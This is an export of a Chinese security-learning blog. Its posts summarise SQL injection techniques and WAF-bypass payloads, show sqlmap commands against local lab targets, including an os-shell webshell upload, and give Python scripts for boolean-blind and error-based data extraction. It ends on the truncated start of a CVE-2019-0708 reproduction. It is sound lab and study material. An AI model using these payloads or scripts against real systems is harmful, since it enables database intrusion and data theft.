{"meta":{"title":"oxxk blog","subtitle":null,"description":null,"author":"0xxk","url":"https://0xxk.github.io","root":"/"},"pages":[{"title":"","date":"2019-08-11T14:59:39.798Z","updated":"2019-08-11T14:59:39.798Z","comments":true,"path":"about/index.html","permalink":"https://0xxk.github.io/about/index.html","excerpt":"","text":"layout: aboutcomments: truereward: false"},{"title":"","date":"2019-08-11T14:59:20.037Z","updated":"2019-08-11T14:59:20.037Z","comments":true,"path":"categories/index.html","permalink":"https://0xxk.github.io/categories/index.html","excerpt":"","text":"layout: categoriescomments: false"},{"title":"","date":"2019-08-11T14:58:20.485Z","updated":"2019-08-11T14:58:20.485Z","comments":true,"path":"tags/index.html","permalink":"https://0xxk.github.io/tags/index.html","excerpt":"","text":"layout: tagscomments: false"}],"posts":[{"title":"SQL注入总结","slug":"注入总结","date":"2019-09-08T16:01:49.106Z","updated":"2019-09-08T16:12:18.798Z","comments":true,"path":"2019/09/09/注入总结/","link":"","permalink":"https://0xxk.github.io/2019/09/09/注入总结/","excerpt":"这两周的SQL注入总结","text":"这两周的SQL注入总结 SQL注入原理​ SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 ​ 注入本质： 1将用户提交的恶意代码和原本的SQL 语句进行拼接，将拼接后的语句带入数据库来执行恶意语句，从而达到非授权任意查询的效果。 ​ 注入漏洞有两个关键条件： 1231.用户能控制输入的内容2.Web应用把用户输入的内容带入到数据库中执行 SQL注入分类根据数据库来分可以分为： 11.Mysql数据库注入 2. Mssql数据库注入 3.Oracle数据库注入 4.Access数据库注入 根据请求方式不同可以分为： 11.GET方式请求注入 2.POST方式请求注入 3.请求头注入 根据sql注入点的参数类型可以分为 11.整数型注入 2.字符型注入 根据sql注入点的反馈类型分 12341.基于错误显示的sql注入 2.union类型的sql注入3.布尔类型的sql注入 4.基于时间的sql注入5.多语句注入 6.内联注入7... 注入过程大体分为这几个主要步骤： 12345671.确定请求方式 2.确定数据库类型 3.寻找注入点 4. 判断注入点的参数类型5.判断截断符号 6.根据注入点的反馈类选择注入方法7.判断WAF过滤字符 8.构建符合标准的注入语句 确定请求方式HTTP 定义了与服务器交互的不同方法，最基本的方法是 GET 和 POST。 GET方式在客户端通过URL提交数据，数据在URL中可以看到，例如在日常中订购服务： 1http：//www.cnblogs.com/javame/index.htm？servId=2 POST方式数据放置在HTML HEADER内提交，数据在URL中看不到 GET只能传输比较少的数据，安全性较低，POST传输数据较多，安全性也比GET高。 确定数据库类型获取数据时，每种数据库架构、语法、类型都是不一样的。 1and (select count(*) from MSysAccessObjects) &gt; 0 返回正常则说明是Access 1and (select count(*) from sysobjects) &gt; 0 返回正常说明是Mssql 1and length(user()) &gt; 0 返回正常说明是MySQL Mssql中可以调用 substring,Oracle 则可调用 substr 寻找注入点精髓 1只要和数据库交互的地方都有可能存在注入 一般就是在URL后面的?id=n 后面，网页搜索框中，登陆帐号，请求头。 判断注入点的参数类型注入点参数类型主要分为:数字型、字符型。 判断数字型: 1如?id=2 ，将2变为3。在?id=后面设置3-1。如果?id=3-1的页面和2的一样，那么就是数字型注入 判断字符型: 1常规字符型有&apos; 、&quot;、&apos;)、&quot;)、))。在?id=2后面分别加入前面的符号。如果报错或者页面回显不正常，那么证明有注入。 判断截断符号在我们确定是字符还是数字型之后，要判断他的截断符号是什么 数字型 1直接在语句后面添加要注入的语句即可 字符型 123在确定完截断符号之后不断尝试注释符号，直到找到拼接后让页面恢复正常的字符。常见的有:-- | %23 /**/ 根据注入点的反馈类选择注入方法当我们确定完注释符号和截断符号时就可以选择注入方法了。大致有六种： 1231.基于错误显示的sql注入 2.union类型的sql注入3.布尔类型的sql注入 4.基于时间的sql注入5.多语句注入 6.内联注入 在这里分情况进行注入 有回显时： 1可以选择union类型的sql注入和基于错误显示的sql注入 无回显时： 1可以选择布尔类型的sql注入和基于时间的sql盲注 特殊情况： 1情况满足可以使用多语句注入。当-- | 等注释符被过滤时可以使用内联注入 判断WAF过滤字符当我们在注入时可能会遇到and select union等关键字符被WAF过滤的情况，这时候就要肠坏死绕过WAF了。常见的绕过方法如下： HTTP参数控制： 123HPP（HTTP Parameter Polution）重复参数污染HPF （HTTP Parameter Fragment）HTTP分割注入 白名单绕过： 12345基于IP地址的白名单，一般很难绕过基于应用层的数据白名单，可能造成bypass特殊目录白名单绕过：admin/dede/install等特殊目录 过滤掉and和or情况下的盲注： 123?id=strcmp(left((select%20username%20from%20users%20limit%200,1),1),0x42)%23?id=strcmp(left((select+username+from+users+limit+0,1),1)0x42)%23 加括号绕过： 123456789?id=-1+union+(select+1,2,3+from+users)%23?id=(-1)union(select(1),(2),(3)from(users))?id=(1)or(0x50=0x50)?id=(-1)union((((()select(1),hex(2),hex(3)from(users)))))?id=-1 union select 1,&#123;x 2&#125;,3 等价函数与命令： 1234567891011121314151617函数或变量：hex()/bin() ==&gt;ascii()sleep ==&gt; benchmark()concat_ws() ==&gt; group_concat()mid()/substr() ==&gt; substring()@@version/datadir ==&gt; version/datadir()逻辑符号：and ==&gt; &amp;&amp;or ==&gt; || 利用注释绕过： 1234567普通注释：?id=1/**/union/**/sElect**/1,2,3%23内联注释：相比普通注释，内联注释用的更多，有一个特性/*!*/只有Mysql能识别,/*!*/表示注释里面的语句会被执行?id-1/*UNION*/%20/*!SELECT*/%201,2,3?d=1%0A/**//*!50000%55nlOn*//*yoyu*/all/*%0A*//*!%53eLEct*/%0A/*nnaa*/+1,2,3/*!50000%55nlOn*/50000表示假如，数据库是5.00.00以上版本，该语句才会被执行 利用编码绕过： 12345Unicode编码单引号：%u0027/%u02b9/%u02bc/%u02c8/%u2032空格：%u0020/%uff00/%c0%20左括号：%u0028/%uff08/%c0%28/右括号：%u0029/%uff09 用特殊字符代替空格： 123456%09 tab键%0a 换行 %0c 新的一页%0d return功能%0b tab键 %a0 空格 特殊符号： 12345反引号`,select`version()`神奇的&quot;-+.&quot;, select+id from users;&quot;+&quot;用于字符串连接，&quot;-&quot;和&quot;.&quot;可以逃过空格和关键字过滤@符号，select @^1.from users;@表用户定义，@@表示系统变量select-conut(id) test from users;//绕过空格规则关键字拆分：&apos;se&apos;+&apos;lec&apos;+&apos;t&apos; %s%e%L%E%c%t 1 构建符合标准的注入语句最后就是将截断符号，注释符，选择后的注入方式，绕过WAF 结合在一起。 注入时常用的函数 函数名称 函数功能 函数名称 函数功能 system_user() 系统函数名 count() 返回执行结果的数量 user() 用户名 concat() 没有分隔符的连接字符串 current_user() 当前用户名 concat_ws() 含有分隔符的连接字符串 session_user() 连接数据库的用户名 load_file() 读取本地的文件 database() 数据库名 into outfile() 写文件 versionI 数据库版本 ascii() 字符串的ASCII代码值 @@datadir 数据库路径 ord() 返回字符串第一个字符的ASCII值 @@basedir 数据库安装路近 mid() 返回一个字符串的一部分 @@version_compile_os 操作系统 substr() 返回7一个字符串的一部分 length() 返回字符串的长度 if() &gt; select if (1&gt;2,2,3); -&gt;3 left() 返回字符串左面的几个字符 strcmp() 比较字符串的内容 floor() 返回小于或等于x的最大整数 ifnull() 假如参数1不为null,则返回值为参数1,否则返回值为参数2 rand() 返回0和1之间的随机数 exp() 返回e的x次方 sleep() 让此语句运行n秒钟 特殊注入方法除去常见的注入方法之外还有这样的注入方法： 1234567二次编码注入二次注入偏移注入外带查询 在这里查漏补缺记一下偏移注入： access偏移注入 [背景] 1231.偏移注入指access偏移注入，主要是由于数据库结构的问题，其他数据库没办法利用2.用于解决判断出表明，得不到字段的困境。 [偏移注入的特点] 1231.看人品和技巧的注入方法，不是%100能成功2.无需管理帐号密码字段，直接爆破帐号密码。 [利用条件] 1231.已知管理表名2.已直任意字段（一个或多个 多个会增加几率） [影响偏移注入成功率的因素] 123451.管理表的字段越少越好（最好就三个 1.id 2.帐号字段 3.密码字段）2.当前注入点的脚本内查询的表内的字段数的字段越多越好（最好有几十个）3.已知的字段数越多越好 [偏移注入的流程] 123451.判断字段数 2.判断表名3.开始偏移注入","categories":[],"tags":[]},{"title":"SQLMAP注入","slug":"sqlmap常规注入操作","date":"2019-09-08T03:43:34.745Z","updated":"2019-09-08T03:50:12.121Z","comments":true,"path":"2019/09/08/sqlmap常规注入操作/","link":"","permalink":"https://0xxk.github.io/2019/09/08/sqlmap常规注入操作/","excerpt":"不停的练习才能让自己变得更强","text":"不停的练习才能让自己变得更强 1.sqlmap常规注入流程2.sqlmap使用http数据包注入3.sqlmap使用—method加—data完成get和post注入4.sqlmap指定cookie注入5.sqlmap注入时设置user-agent6.sqlmap写文件7.sqlmap读文件8.sqlmap执行系统命令 本次作业靶场使用sqli 和DVWA来完成 常规注入流程在这里使用http://192.168.107.128/sqli/Less-1/?id=1 使用-u 查看是否有注入 使用–current-user 查看操作系统用户 –current-db 查看当前库名 –users数据库管理员sqlmap -u “http://192.168.107.128/sqli/Less-1/?id=1&quot;发现有注入 sqlmap -u “http://192.168.107.128/sqli/Less-1/?id=1&quot; –current-user当前用户是root sqlmap -u “http://192.168.107.128/sqli/Less-1/?id=1&quot; –current-db当前数据库是security 有这些用户 sqlmap -u “http://192.168.107.128/sqli/Less-1/?id=1&quot; –dbs查看有哪些库 sqlmap -u “http://192.168.107.128/sqli/Less-1/?id=1&quot; -D security –tables查看security库有哪些表 sqlmap -u “http://192.168.107.128/sqli/Less-1/?id=1&quot; -D security -T users –column查看security中的users表有哪些字段 sqlmap -u “http://192.168.107.128/sqli/Less-1/?id=1&quot; –dump -D security -T users在这里dump出security库中users表的数据 使用http数据包进行注入在这里使用http://192.168.107.128/sqli/Less-11/进行测试 首先使用burp将要注入的数据包保存为test.txt sqlmap -r “C:\\Users\\Leafer\\Desktop\\ceshi\\test.txt” 接下来也是和GET行一样的操作，就不再重复了sqlmap -r “C:\\Users\\Leafer\\Desktop\\ceshi\\test.txt” –dbs sqlmap使用—method加—data完成get和post注入在这里使用–method=”post”指定sqlmap-u”http://192.168.107.128/sqli/Less-13/&quot;--method=&quot;post&quot;--data=&quot;uname=1&amp;passwd=2&amp;submit=Submit&quot; 使用最原始的-u就可以指定GET注入类型 sqlmap指定cookie注入在这里使用DVWA的cookie登录注入，如果要使用cookie则将-v 调整为2即以上http://192.168.107.128/dvwa/vulnerabilities/sqli/这里是GET型数据，先不指定COOKIE用SQLMAP去跑 在这里会显示302让你先登陆后测试，选择Y或者N都会跑失败。 这时候就要指定cookie了，在此处使用burp来抓取cookieCookie: security=low; PHPSESSID=gqvba2822fuisoc6r2d70am1q0 sqlmap注入时设置user-agent在这里使用的还是http://192.168.107.128/sqli/Less-1/?id=1将我的头设置为zheshiyigezuoye sqlmap写文件在这里用的还是注入less-1靶场sqlmap-u”http://192.168.107.128/sqli/Less-1/?id=1&quot;--file-write=&quot;C:\\Users\\Leafer\\Desktop\\ceshi\\test.txt&quot; –file-dest=”/var/www/html/hack.php” 当前文件夹下有这个文件 sqlmap读文件 去文件夹中查看数据 sqlmap执行系统命令在这里使用-os-shell上传小马来执行系统命令 在这里选择1 于是就在文件夹中写下了一个tmpbgyha.php的shell 执行一下系统命令","categories":[],"tags":[]},{"title":"MYSQL注入之布尔盲注","slug":"mysql报错注入","date":"2019-09-08T02:31:15.508Z","updated":"2019-09-08T02:51:45.275Z","comments":true,"path":"2019/09/08/mysql报错注入/","link":"","permalink":"https://0xxk.github.io/2019/09/08/mysql报错注入/","excerpt":"学习sql盲注的过程","text":"学习sql盲注的过程 http://192.168.107.128/sqli/Less-8/?id=1&#39; – |首先判断出注入点和注释符号，然后在中间拼接我们的注入语句。按常规流程走，查看字段长度，查看回显位。http://192.168.107.128/sqli/Less-8/?id=1&#39; order by 4 – |错误http://192.168.107.128/sqli/Less-8/?id=1&#39; order by 3 – |正确这时候开始查看回显位http://192.168.107.128/sqli/Less-8/?id=1&#39; union select 1,2,3 – |这时候看到页面回显正常，但是没有回显位。因此判断是盲注，在这里使用布尔盲注。 http://192.168.107.128/sqli/Less-8/?id=1&#39;and (select count(schema_name) from information_schema.schemata) &gt; 5 – | 使用二分法找到正确的数值http://192.168.107.128/sqli/Less-8/?id=1&#39;and (select count(schema_name) from information_schema.schemata) &gt; 4 – | 可以看到有5个数据库在这里描述一下我的思路，首先我们要查到有多少数据库。其次要查询每个数据库是多少字符，最后查看每个字符对应的值。在这里已经查询到了有5个数据库，现在查询第一个数据库长度。 http://192.168.107.128/sqli/Less-8/?id=1&#39; and length((select schema_name from information_schema.schemata limit 0,1)) &gt;20 – | 使用二分法逐个查询 可以看到这里第一行一共有18个字符 现在查询第一行数据库18个字符中的第一个字符， http://192.168.107.128/sqli/Less-8/?id=1&#39; and ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1)) &gt; 100 – | 使用二分法进行测试，查看第一个字符是啥。 在这里可以看到是ascii码为105的字符 105对应着的字符是 在查询完第一个之后依次查询对应的数值。手工注入太麻烦了，在这里根据规则写一个自动脚本。以下是针对库名的布尔注入（脚本会在今天的作业中慢慢完善，直到拼接我之前的工具写成属于自己的注入工具）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# coding=UTF-8import requestsimport reimport base64import sysreload(sys)sys.setdefaultencoding( &quot;utf-8&quot; )def qingqiu(url1,url2): # print url1 # print url2 # return 1 html1 = requests.get(url1) html2 = requests.get(url2) if html1.text != html2.text: return 1# def chahangshu():## def changzifushu():#def chashuzhi(url,url_chashuzi,hangshu,zifushu): global jieduan qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi for i in range(hangshu): qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot; # print qingqiuURLi list = [] for j in range(zifushu[i]): qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1) # print qingqiuURLj for m in range(33,127): qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1] qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1] jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2) # print qingqiuURLm if jieguo: print chr(m+1) print qingqiuURLm2 list.append(chr(m+1)) break print list print qingqiuURLdef chaschema_name(url): url_schema = &quot;select schema_name from information_schema.schemata&quot; # hangshu = chahangshu() # zifushu = changzifushu() hangshu = 4 zifushu = [18,18,18,18] listhang = chashuzhi(url,url_schema,hangshu,zifushu)def main(): global zifu,jieduan jieduan = [&apos;\\&apos;&apos;,&apos;-- |&apos;] url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot; schema_name = chaschema_name(url)if __name__ == &apos;__main__&apos;: main()可以看到5行数据已经爆出来了（后期脚本有改动） 接下来完善布尔查询行数和每行查询字符数的功能（这让手工也忒累了吧！）下面的脚本可以跑出数据库的数量，每个数据库的字符长度和数据库名。 代码如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# coding=UTF-8import requestsimport reimport base64import sysreload(sys)sys.setdefaultencoding( &quot;utf-8&quot; )def qingqiu(url1,url2): # print url1 # print url2 # return 1 html1 = requests.get(url1) html2 = requests.get(url2) if html1.text != html2.text: return 1def chahangshu(url,url1,url2,url3): global jieduan # print url1,url2,url3 url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot; print url for i in range(0,29): url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1]) url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1]) jieguo = qingqiu(url_i1,url_i2) if jieguo: return i+1def chazifushu(url,url_chashuzi,hangshu): global jieduan url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi list = [] for i in range(hangshu): url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot; for j in range(0,50): url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1] url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1] jieguo = qingqiu(url3_1, url3_2) if jieguo: print &quot;第&#123;&#125;个数据库字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1) list.append(j+1) break return list # print url3def chashuzhi(url,url_chashuzi,hangshu,zifushu): global jieduan qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi for i in range(hangshu): qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot; # print qingqiuURLi list = [] for j in range(zifushu[i]): qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1) # print qingqiuURLj for m in range(33,127): qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1] qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1] jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2) # print qingqiuURLm if jieguo: print chr(m+1), # print qingqiuURLm2 list.append(chr(m+1)) break print list print qingqiuURLdef chaschema_name(url): url_schema1 = &quot;select&quot; url_schema2 = &quot;schema_name&quot; url_schema3 = &quot;from information_schema.schemata&quot; url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3 hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3) print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu) # hangshu = 5 zifushu = chazifushu(url, url_schema, hangshu) print zifushu listhang = chashuzhi(url,url_schema,hangshu,zifushu)def main(): global zifu,jieduan jieduan = [&apos;\\&apos;&apos;,&apos;-- |&apos;] url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot; schema_name = chaschema_name(url)if __name__ == &apos;__main__&apos;: main() 查库的数据AND查表的数据AND查字段的数据，根本上都是进行了三部，首先查行数，再查每行字符数，最后查每行的单个数据。所以接下来查表名的脚本几乎差不多，只是将核心查询语句改了罢了！代码运行如下： 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204# coding=UTF-8import requestsimport reimport base64import sysreload(sys)sys.setdefaultencoding( &quot;utf-8&quot; )def qingqiu(url1,url2): html1 = requests.get(url1) html2 = requests.get(url2) if html1.text != html2.text: return 1def chahangshu(url,url1,url2,url3): global jieduan print &quot;1111111&quot; print url1,url2,url3 url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot; print url for i in range(0,29): url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1]) url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1]) jieguo = qingqiu(url_i1,url_i2) if jieguo: return i+1def chazifushu(url,url_chashuzi,hangshu): global jieduan url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi list = [] for i in range(hangshu): url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot; for j in range(0,50): url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1] url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1] jieguo = qingqiu(url3_1, url3_2) if jieguo: print &quot;第&#123;&#125;行字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1) list.append(j+1) break return list # print url3def chashuzhi(url,url_chashuzi,hangshu,zifushu): global jieduan list = [] qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi for i in range(hangshu): qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot; flag = &quot;&quot; # print qingqiuURLi for j in range(zifushu[i]): qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1) # print qingqiuURLj for m in range(33,127): qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1] qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1] jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2) # print qingqiuURLm if jieguo: print chr(m+1), # print qingqiuURLm2 flag+= chr(m+1) # list.append(chr(m+1)) break print flag list.append(flag) print list return listdef chaschema_name(url): url_schema1 = &quot;select&quot; url_schema2 = &quot;schema_name&quot; url_schema3 = &quot;from information_schema.schemata&quot; url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3 hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3) print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu) # # hangshu = 5 zifushu = chazifushu(url, url_schema, hangshu) print zifushu listhang = chashuzhi(url,url_schema,hangshu,zifushu) # print &quot;------&quot; print listhang # print &quot;------&quot; return listhangdef chatable_name(url,schema_name): url_table1 = &quot;select&quot; url_table2 = &quot;table_name&quot; url_table3 = &quot;from information_schema.tables where table_schema = &apos;&#123;&#125;&apos;&quot;.format(schema_name) url_table = url_table1 + &quot; &quot; + url_table2 + &quot; &quot; + url_table3 hangshu = chahangshu(url, url_table1, url_table2, url_table3) print &quot;&#123;&#125;库一共有&#123;&#125;张表&quot;.format(schema_name,hangshu) zifushu = chazifushu(url, url_table, hangshu) print zifushu listhang = chashuzhi(url, url_table, hangshu, zifushu) print &quot;------&quot; print listhang print &quot;------&quot; return listhangdef chacolumn_name(url,schema_name,table_name): url_column1 = &quot;select&quot; url_column2 = &quot;column_name&quot; url_column3 = &quot;from information_schema.columns where table_schema = &apos;&#123;&#125;&apos; and table_name = &apos;&#123;&#125;&apos;&quot;.format(schema_name,table_name) url_column = url_column1 + &quot; &quot; + url_column2 + &quot; &quot; + url_column3 # print url_column hangshu = chahangshu(url, url_column1, url_column2, url_column3) print &quot;&#123;&#125;表一共有&#123;&#125;个字段&quot;.format(table_name,hangshu) zifushu = chazifushu(url, url_column, hangshu) print &quot;***&quot; print zifushu listhang = chashuzhi(url, url_column, hangshu, zifushu) print &quot;------&quot; print listhang print &quot;------&quot; return listhangdef cha_shuju(url, schema_name,table_name,column_name): url_shuzhi1 = &quot;select&quot; url_shuzhi2 = &quot;&#123;&#125;&quot;.format(column_name) url_shuzhi3 = &quot;from &#123;&#125;.&#123;&#125;&quot;.format(schema_name,table_name) url_shuzhi = url_shuzhi1 + &quot; &quot; + url_shuzhi2 + &quot; &quot; + url_shuzhi3 # print url_column hangshu = chahangshu(url, url_shuzhi1, url_shuzhi2, url_shuzhi3) print &quot;&#123;&#125;库&#123;&#125;表&#123;&#125;字段一共有&#123;&#125;行&quot;.format(schema_name,table_name,column_name, hangshu) zifushu = chazifushu(url, url_shuzhi, hangshu) print &quot;***&quot; print zifushu listhang = chashuzhi(url, url_shuzhi, hangshu, zifushu) print &quot;------&quot; print listhang print &quot;------&quot; return listhangdef main(): global zifu,jieduan jieduan = [&apos;\\&apos;&apos;,&apos;-- |&apos;] url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot; schema_name = chaschema_name(url) print &quot;一共有如下表&#123;&#125;&quot;.format(schema_name) zhiding_schema = raw_input(&quot;请输入要查询的库名&quot;) # zhiding_schema = &apos;security&apos; # schema_name = [&apos;information_schema&apos;, &apos;challenges&apos;, &apos;mysql&apos;, &apos;performance_schema&apos;, &apos;security&apos;] i =1 while (i): for i in schema_name: print i,zhiding_schema if zhiding_schema == i: table_name = chatable_name(url, zhiding_schema) print &quot;&#123;&#125;库有如下表&#123;&#125;&quot;.format(zhiding_schema,table_name) i =0 break if(i ==1): zhiding_schema = input(&quot;不存在此库，请检查是否输入错误&quot;) zhiding_table = raw_input(&quot;请输入要查询的表名&quot;) # # print zhiding_table # table_name = [&apos;emails&apos;, &apos;referers&apos;, &apos;uagents&apos;, &apos;users&apos;] # zhiding_table = &quot;emails&quot; i = 1 while (i): for i in table_name: print i, zhiding_table if zhiding_table == i: columns_name = chacolumn_name(url, zhiding_schema,zhiding_table) i = 0 print &quot;&#123;&#125;表有如下字段&#123;&#125;&quot;.format(zhiding_table,columns_name) break if(i == 1): zhiding_table = input(&quot;不存在此表，请检查是否输入错误&quot;) zhiding_column = raw_input(&quot;请输入要查询的字段&quot;) # # print zhiding_column # columns_name = [&apos;id&apos;, &apos;email_id&apos;] # zhiding_table = &quot;emails&quot; i = 1 while (i): for i in columns_name: print i, zhiding_column if zhiding_column == i: shuju_name = cha_shuju(url, zhiding_schema, zhiding_table,zhiding_column) print &quot;&#123;&#125;字段数值有&#123;&#125;&quot;.format(zhiding_column,shuju_name) i = 0 break if (i == 1): zhiding_table = input(&quot;不存在此字段，请检查是否输入错误&quot;)if __name__ == &apos;__main__&apos;: main()","categories":[],"tags":[]},{"title":"python脚本之报错注入函数检测","slug":"python脚本之报错注入函数检测","date":"2019-09-07T14:26:08.724Z","updated":"2019-09-07T15:36:48.613Z","comments":true,"path":"2019/09/07/python脚本之报错注入函数检测/","link":"","permalink":"https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/","excerpt":"使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数","text":"使用脚本批量去判断每个网站使用的数据库能使用的报错注入函数 在这里将每个网址和他对应的数据库用字典连接起来，方便输出时查看函数。 1banben = &#123;&quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;:&quot;版本为mysql8.0&quot;,&quot;http://192.168.100.197/Less-2/?id=1&quot;:&quot;版本为mysql5.0&quot;,&quot;http://192.168.100.144/index.php?author=admin&apos;&quot;:&quot;版本为mariadb 5.5&quot;&#125; 将常见的报错注入函数放入列表中方便遍历 123456789101112li = [ &quot;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;, &quot;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))&quot;, &quot;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))&quot;, &quot;and geometrycollection((select * from(select * from(select user())a)b))&quot;, &quot;and multipoint((select * from(select * from(select user())a)b))&quot;, &quot;and polygon((select * from(select * from(select user())a)b))&quot;, &quot;and multipolygon((select * from(select * from(select user())a)b))&quot;, &quot;and linestring((select * from(select * from(select user())a)b))&quot;, &quot;and multilinestring((select * from(select * from(select user())a)b))&quot;, &quot;and exp(~(select * from(select user())a))&quot; ] 使用root作为关键字判断网页是否有回显，如果有回显证明此报错注入函数有用。 1root@localhost 总体代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243# coding=UTF-8import requestsimport reimport base64import sysreload(sys)sys.setdefaultencoding( &quot;utf-8&quot; )lists = [ &quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;, &quot;http://192.168.100.197/Less-5/?id=1&quot;, &quot;http://192.168.100.144/index.php?author=admin&apos;&quot; ]banben = &#123;&quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;:&quot;版本为mysql8.0&quot;,&quot;http://192.168.100.197/Less-2/?id=1&quot;:&quot;版本为mysql5.0&quot;,&quot;http://192.168.100.144/index.php?author=admin&apos;&quot;:&quot;版本为mariadb 5.5&quot;&#125;print banben[&quot;http://localhost/test/showNews/lib/xinwenmoreandpinglun.php?action=123&apos;&quot;]li = [ &quot;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;, &quot;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))&quot;, &quot;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))&quot;, &quot;and geometrycollection((select * from(select * from(select user())a)b))&quot;, &quot;and multipoint((select * from(select * from(select user())a)b))&quot;, &quot;and polygon((select * from(select * from(select user())a)b))&quot;, &quot;and multipolygon((select * from(select * from(select user())a)b))&quot;, &quot;and linestring((select * from(select * from(select user())a)b))&quot;, &quot;and multilinestring((select * from(select * from(select user())a)b))&quot;, &quot;and exp(~(select * from(select user())a))&quot; ]for i in range(len(lists)): url = lists[i] print &quot;这时候测试的是&#123;&#125;&quot;.format(banben[url]) for j in range(len(li)): yuju = lists[i]+ &quot; &quot; + format(li[j]) + &quot; -- |&quot; shuju = requests.get(yuju) r = r&apos;root@localhost&apos; jieguo = re.search(r,shuju.text) if jieguo : print li[j]","categories":[],"tags":[]},{"title":"CVE-2019-0708本地复现","slug":"CVE2019-0708本地复现","date":"2019-09-07T09:16:45.316Z","updated":"2019-09-07T16:25:53.531Z","comments":true,"path":"2019/09/07/CVE2019-0708本地复现/","link":"","permalink":"https://0xxk.github.io/2019/09/07/CVE2019-0708本地复现/","excerpt":"0708千呼万唤始出来，又将是一片腥风血雨","text":"0708千呼万唤始出来，又将是一片腥风血雨 CVE-2019-0708的危害性 Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广，windows2003、windows2008、windows2008 R2、windows xp * 系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。 复现环境首先搭建环境，我这里使用的是win7旗舰版（家庭版升级而来）,KALI自带的v5.0.45版本MSF。 win7环境搭建在VMware Fusion中安装windows7 SP1版本模拟受害机 Windows7 